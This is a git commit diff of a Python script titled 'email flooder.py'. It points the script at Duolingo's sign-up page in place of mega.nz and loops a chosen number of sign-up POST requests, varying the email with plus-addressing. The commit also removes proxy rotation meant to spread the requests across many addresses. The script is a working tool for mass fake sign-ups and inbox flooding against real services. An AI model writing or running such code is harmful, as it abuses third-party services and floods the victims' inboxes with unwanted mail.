7a6e7e98ab797de64971a95f1b3fd06b03f0ed77
ahmadjerjawi <72747814+ahmadjerjawi@users.noreply.github.com>
2022-12-19 16:16:17 +0200

    Update email flooder.py

--- email flooder.py
+++ email flooder.py
@@ -1,15 +1,24 @@
 import requests
 
 # Set the URL of the Duolingo sign-up page
-url = "https://mega.nz/register"
-import requests
+url = "https://www.duolingo.com/welcome?isLoggingIn=true"
 
 # Get the number of iterations to send the request from the user
 num_iterations = int(input("Enter the number of sign-up requests to send: "))
 
 # Define the base data for the request
 base_data = {
-    "identifier": "email@mail.com",
+    "age": "55",
+    "email": "gmail@gmail.com",
+    "fromLanguage": "en",
+    "identifier": "",
+    "initialReferrer": "https://www.duolingo.com/",
+    "landingUrl": "https://www.duolingo.com/welcome",
+    "name": "",
+    "password": "",
+    "signal": None,
+    "timezone": "Asia/Jerusalem",
+    "username": None,
 }
 
 # Initialize the counter with the last iteration number stored in a file
@@ -19,50 +28,22 @@ try:
 except FileNotFoundError:
     counter = 0
 
-# Read the list of proxies from a file or a URL
-proxies = []
-
-# Option 1: Read the proxies from a file
-try:
-    with open("proxies.txt", "r") as f:
-        for line in f:
-            proxy = line.strip()
-            if proxy:
-                proxies.append(proxy)
-except FileNotFoundError:
-    pass
-
-# Option 2: Get the proxies from a URL
-if not proxies:
-    try:
-        response = requests.get("http://example.com/proxies")
-        for line in response.text.split("\n"):
-            proxy = line.strip()
-            if proxy:
-                proxies.append(proxy)
-    except Exception as e:
-        print(f"Error getting proxies: {e}")
-
 # Send the request in a loop
 for i in range(num_iterations):
     # Split the base username into parts around the "@" character
-    username_parts = base_data['identifier'].split("@")
+    username_parts = base_data['email'].split("@")
 
     # Insert the iteration number into the middle of the username
-    modified_username = f"{username_parts[0]}+{counter + 1}@{username_parts[1]}"
+    modified_username = f"{username_parts[0]}+{counter+1}@{username_parts[1]}"
 
     # Modify the data for this iteration by replacing the username with the modified version
     data = {
         **base_data,
-        "identifier": modified_username
+        "email": modified_username
     }
 
-    # Select a proxy from the list
-    proxy = proxies[i % len(proxies)]
-
-    # Send the request using the selected proxy
-    response = requests.post(url, data=data, proxies={"http": proxy, "https": proxy})
-    print(f"Response status code: {response.status_code} (proxy: {proxy})")
+    response = requests.post(url, data=data)
+    print(f"Response status code: {response.status_code}")
 
     # Increment the counter
     counter += 1
@@ -70,3 +51,6 @@ for i in range(num_iterations):
 # Save the counter to a file for the next time the script is run
 with open("counter.txt", "w") as f:
     f.write(str(counter))
+
+# Print the last modified username used
+print(f"Last modified username: {modified_username}")
